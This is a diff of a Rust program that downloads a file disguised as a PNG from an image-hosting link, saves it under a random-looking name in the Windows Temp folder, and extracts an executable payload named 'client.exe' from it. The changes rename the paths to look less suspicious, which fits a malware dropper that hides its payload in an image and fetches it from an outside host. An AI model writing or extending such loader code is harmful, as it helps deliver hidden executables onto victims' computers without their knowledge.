@@ -2,8 +2,8 @@ use std::fs::{File, OpenOptions, remove_file};
 use std::io::{Read, Write, copy};
 use std::process;
 
-const PNG_PATH: &str = "test.png";
-const PAYLOAD_PATH: &str = "payload.exe";
+const PNG_PATH: &str = "C:\\Windows\\Temp\\08892F3D1BAD5.png";
+const PAYLOAD_PATH: &str = "client.exe";
 const PAYLOAD_LINK: &str = "https://i.postimg.cc/rqxBdwQM/bart-simpson-png-21-new.png?dl=1";
 
 pub async fn download_payload() -> Result<(), Box<dyn std::error::Error>> {
@@ -13,7 +13,7 @@ pub async fn download_payload() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     let mut file = File::create(PNG_PATH)?; // Create the output file
-    let mut content = response.bytes().await?; // Get the file content
+    let content = response.bytes().await?; // Get the file content
     copy(&mut content.as_ref(), &mut file)?;   // Write content to the file
 
     extract_payload();
@@ -30,6 +30,7 @@ fn extract_payload() {
     let mut file = match File::open(PNG_PATH) {
         Ok(file) => file,
         Err(err) => {
+            eprintln!("{}",err);
             process::exit(1);
         }
     };
